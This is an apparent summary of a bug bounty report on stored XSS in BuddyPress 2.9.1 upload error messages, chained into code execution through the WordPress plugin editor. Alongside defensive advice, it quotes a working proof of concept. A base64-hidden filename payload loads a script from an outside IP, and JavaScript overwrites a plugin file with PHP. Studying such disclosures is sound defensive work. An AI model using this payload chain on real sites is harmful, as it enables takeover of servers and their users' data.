# BuddyPress 2.9.1 - Unsanitized Filename in Upload Error Leading to XSS and RCE

## Metadata
- **Source:** HackerOne
- **Report:** 263109 | https://hackerone.com/reports/263109
- **Submitted:** 2017-08-24
- **Reporter:** skansing
- **Program:** BuddyPress
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding, Remote Code Execution (RCE)
- **CVEs:** None
- **Category:** web-api

## Summary
BuddyPress 2.9.1 fails to sanitize filenames in error messages when users exceed maximum upload size limits for profile images, resulting in stored XSS. An authenticated admin attacker can chain this XSS vulnerability with same-origin scripting techniques to achieve arbitrary code execution by modifying plugin files.

## Attack scenario
1. Attacker authenticates as administrator to the WordPress site
2. Attacker crafts a malicious filename containing JavaScript payload embedded in base64 and wrapped in img onerror tag
3. Attacker navigates to profile upload page (/wp-admin/users.php?page=bp-profile-edit) or member avatar/cover image endpoints
4. Attacker uploads a file exceeding size limits with the malicious filename, triggering the unsanitized error message containing the XSS payload
5. Error message reflects the filename unsanitized in the DOM, executing the JavaScript payload in admin's browser context
6. Payload uses XSSI technique to inject iframe pointing to plugin editor, modifying hello.php with malicious PHP code via DOM manipulation, achieving RCE

## Root cause
BuddyPress outputs filenames from upload error messages directly to HTML without sanitization or HTML entity encoding. The error handling mechanism fails to escape user-controlled filename data before rendering it in the response, allowing JavaScript injection.

## Attacker mindset
An admin attacker seeks to maintain persistence or escalate privileges by converting an XSS vulnerability into code execution. The attacker leverages same-origin policy and CSRF-like behavior through iframe manipulation to bypass client-side restrictions and modify server-side plugin code without additional authentication prompts.

## Defensive takeaways
- Always HTML-encode/escape user-controlled data (including filenames) before outputting to HTML context using appropriate functions like htmlspecialchars() or equivalent HTML entity encoding
- Implement Content Security Policy (CSP) headers to restrict inline script execution and external script sources
- Validate and sanitize filenames on upload, rejecting or stripping special characters that could be used in payload construction
- For admin pages, implement additional CSRF tokens and verification for sensitive operations like file editing
- Use security functions like sanitize_file_name() and sanitize_text_field() for all user inputs including error messages
- Apply principle of least privilege: restrict plugin editor access and file modification capabilities
- Implement output encoding at the template/view layer for all dynamic content
- Consider disallowing or blocking file upload with suspicious characters in filenames

## Variant hunting
Search for similar unsanitized filename outputs in: (1) media upload error messages across WordPress plugins, (2) avatar/profile image handling functions in membership plugins, (3) any file upload handlers that display filenames in error responses, (4) export/import features that reference user-provided filenames, (5) admin pages that display file logs or history, (6) backup/restore functionality showing filenames

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1059.004
- T1047

## Notes
This vulnerability is noted as similar to a previous report (#203515) suggesting a recurring pattern in BuddyPress's output handling. The attack requires admin privileges, limiting direct impact but enabling full system compromise. The base64 encoding of the payload suggests attempt to evade simple pattern-matching WAF/IDS. The XSSI technique demonstrates sophisticated chaining of multiple web security flaws for RCE achievement.

## Full report
<details><summary>Expand</summary>

# Description
This report is very similar to https://hackerone.com/bugs?subject=user&report_id=203515 so I will not go into too much details.

When uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.

The interfaces for upload that are vuln can be found at
domain.tld/members/USERNAME/profile/change-cover-image/
domain.tld/members/bbuser/profile/change-avatar/
domain.tld/wp-admin/users.php?page=bp-profile-edit
 
# POC
The POC explores a chain of XSS => XSSI => RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions

- Login as admin
- Goto `/wp-admin/users.php?page=bp-profile-edit`
- Upload a file with the following name (mentioned below) as admin for.

Filename 
`POC<img src=x onerror='document.write(atob("UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4="))'>`

The base64 data can be verified by
`btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');` in the browser conole.

This scripts loads the RCE script that changes the hello.php with <?php phpinfo() and redirect to it.
```
var i = document.createElement("iframe");
i.src = "http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php";
document.querySelector("body").appendChild(i);
setTimeout(function() {
  var p = "<?php phpinfo();"
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
```

# Suggested fix
Sanitize the error. I suspect it needs a run through `.html()` as in #203515


</details>

---
*Analysed by Claude on 2026-05-12*
